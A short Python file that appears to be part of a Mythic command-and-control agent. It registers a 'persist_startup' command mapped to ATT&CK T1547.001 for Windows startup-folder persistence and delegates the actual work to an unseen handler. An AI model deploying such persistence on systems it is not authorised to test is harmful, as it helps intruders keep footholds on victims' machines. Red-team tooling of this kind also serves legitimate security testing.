from mythic_container import MythicCommandBase, MythicTask
from mythic_container import TaskArguments


class PersistStartupArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class PersistStartupCommand(MythicCommandBase):
    cmd = "persist_startup"
    needs_admin = False
    help_cmd = "persist_startup"
    description = "Establish persistence via Windows startup folder"
    version = 1
    author = "@phantom"
    argument_class = PersistStartupArguments
    attackmapping = ["T1547.001"]

    async def create_go_tasking(self, taskData: MythicTask) -> str:
        return "PersistenceHandler.CreateStartupPersistence()"

    async def process_response(self, task: MythicTask, response: any) -> str:
        return f"Startup persistence: {response}"